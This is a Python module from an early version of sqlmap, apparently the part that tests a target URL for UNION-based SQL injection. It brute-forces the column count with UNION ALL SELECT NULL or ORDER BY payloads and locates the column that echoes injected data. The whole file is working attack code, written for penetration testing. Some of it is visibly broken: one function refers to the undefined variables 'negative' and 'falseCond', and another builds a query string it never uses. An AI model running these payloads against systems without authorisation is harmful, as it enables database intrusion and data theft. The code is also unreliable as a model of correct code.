#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.session import setUnion
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request

def __unionPosition(negative=False, falseCond=False, count=None, comment=None):
    validPayload = None

    if count is None:
        count = kb.unionCount

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for exprPosition in range(0, count):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition, count=count, comment=comment)
        payload = agent.payload(newValue=query, negative=negative, falseCond=falseCond)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)

        if resultPage and randQuery in resultPage:
            setUnion(position=exprPosition)
            validPayload = payload

            break

    return validPayload

def __unionConfirm(count=None, comment=None):
    validPayload = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    if not isinstance(kb.unionPosition, int):
        debugMsg = "testing full inband with %s columns" % count
        logger.debug(debugMsg)

        validPayload = __unionPosition(count=count, comment=comment)

        # Assure that the above function found the exploitable full inband
        # SQL injection position
        if not isinstance(kb.unionPosition, int):
            debugMsg = "testing single-entry inband value with %s columns" % count
            logger.debug(debugMsg)

            validPayload = __unionPosition(negative=True, count=count, comment=comment)

            # Assure that the above function found the exploitable partial
            # (single entry) inband SQL injection position with negative
            # parameter validPayload
            if not isinstance(kb.unionPosition, int):
                # NOTE: disable false condition for the time being, in the
                # end it produces the same as prepending the original
                #  parameter value with a minus (negative)
                #validPayload = __unionPosition(falseCond=True, count=count, comment=comment)
                #
                # Assure that the above function found the exploitable partial
                # (single entry) inband SQL injection position by appending
                # a false condition after the parameter validPayload
                #if not isinstance(kb.unionPosition, int):
                #    return None
                #else:
                #    setUnion(falseCond=True)
                return None
            else:
                setUnion(negative=True)

    return validPayload

def __unionTestByNULLBruteforce(comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    query = agent.prefixQuery("UNION ALL SELECT NULL")

    for count in range(1, conf.uCols+1):
        if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", NULL"

        if kb.dbms == DBMS.ORACLE:
            query += " FROM DUAL"

        validPayload = __unionConfirm(count, comment)

        if validPayload:
            setUnion(count=count)
            break

    return validPayload

def __unionTestByOrderBy(comment):
    columns = None
    prevPayload = ""

    for count in range(1, conf.uCols+2):
        query = agent.prefixQuery("ORDER BY %d" % count)
        orderByQuery = agent.suffixQuery(query, comment)
        payload = agent.payload(newValue=orderByQuery, negative=negative, falseCond=falseCond)
        _, seqMatcher = Request.queryPage(payload, getSeqMatcher=True)

        if seqMatcher >= 0.6:
            columns = count
            setUnion(count=count)
        elif columns:
            break

        prevPayload = payload

    return columns

def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    if kb.unionTest is not None:
        return kb.unionTest

    if conf.uTech == "orderby":
        technique = "ORDER BY clause bruteforcing"
    else:
        technique = "NULL bruteforcing"

    infoMsg  = "testing inband sql injection on parameter "
    infoMsg += "'%s' with %s technique" % (kb.injParameter, technique)
    logger.info(infoMsg)

    validPayload = None

    for comment in (queries[kb.dbms].comment.query, ""):
        if conf.uTech == "orderby":
            validPayload = __unionTestByOrderBy(comment)
        else:
            validPayload = __unionTestByNULLBruteforce(comment)

        if validPayload:
            setUnion(comment=comment)

            break

    if isinstance(kb.unionPosition, int):
        infoMsg  = "the target url is affected by an exploitable "
        infoMsg += "inband sql injection vulnerability "
        infoMsg += "on parameter '%s' with %d columns" % (kb.injParameter, kb.unionCount)
        logger.info(infoMsg)
    else:
        infoMsg  = "the target url is not affected by an exploitable "
        infoMsg += "inband sql injection vulnerability "
        infoMsg += "on parameter '%s'" % kb.injParameter
        logger.info(infoMsg)

    validPayload = agent.removePayloadDelimiters(validPayload, False)
    setUnion(payload=validPayload)

    return kb.unionTest
